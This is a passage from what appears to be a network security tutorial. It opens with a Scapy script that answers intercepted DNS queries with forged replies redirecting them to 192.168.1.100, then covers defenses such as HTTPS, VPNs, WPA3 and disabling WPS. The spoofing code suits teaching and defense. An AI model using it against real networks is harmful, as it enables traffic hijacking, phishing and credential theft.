    def dns_spoof(pkt):


    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:


    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\


    UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\


    DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname,
    ttl=10, rdata=" 192.168.1.100")


    send(spoofed_pkt)


    sniff(filter="udp port 53", prn=dns_spoof)


    2.  Analyze the Results: This script redirects all DNS requests to the IP 192.168.1.100.
    Use Wireshark to capture and verify modified DNS packets.


    # Defense Techniques


    Protecting a network against packet sniffing and spoofing requires a combination
    of good security practices, monitoring tools, and user education.


    # Traffic Encryption


    Encryption is the most effective defense against packet sniffing. Using HTTPS,
    VPNs, and end-to-end encryption ensures that even if packets are intercepted,
    the data remains inaccessible to the attacker.


    ● Using HTTPS: Make sure all websites and web services use HTTPS. Network administrators
    must force the use of HTTPS on all connections.


    ● VPN Configuration: Set up and use VPNs to encrypt all network traffic, especially
    when accessing public Wi-Fi networks.


    # Implementing Security in Wi-Fi Networks


    Properly configuring Wi-Fi network security is crucial to preventing sniffing
    and spoofing.


    ● Using WPA3: WPA3 offers significantly improved security compared to WPA2\. Configure
    the router to use WPA3 if available.


    ● Disabling WPS: WPS is vulnerable to brute force attacks. Disable it on your
    router to avoid these vulnerabilities.


    # Network Monitoring


    Implementing network monitoring systems can help detect suspicious activity in
    real time.


